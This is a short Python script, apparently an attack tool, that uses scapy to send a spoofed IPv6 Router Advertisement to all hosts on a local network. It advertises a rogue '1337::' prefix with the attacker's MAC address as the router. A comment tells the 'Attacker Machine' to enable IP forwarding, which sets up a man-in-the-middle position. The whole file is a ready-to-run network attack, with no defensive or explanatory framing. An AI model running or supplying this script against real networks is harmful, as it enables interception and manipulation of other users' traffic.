#!/usr/bin/env python
from scapy.all import *

"""Attacker Machine:
	Enable IPV4 forwarding:
		echo 1 > /proc/sys/net/ipv4/ip_forward"""

a = IPv6()
a.dst = "ff02::1"
b = ICMPv6ND_RA()
c = ICMPv6NDOptSrcLLAddr(lladdr = "ATTACKER_MAC_ADDR")
d = ICMPv6NDOptMTU()
e = ICMPv6NDOptPrefixInfo(prefixlen = 64, prefix = "1337::")
send(a/b/c/d/e)
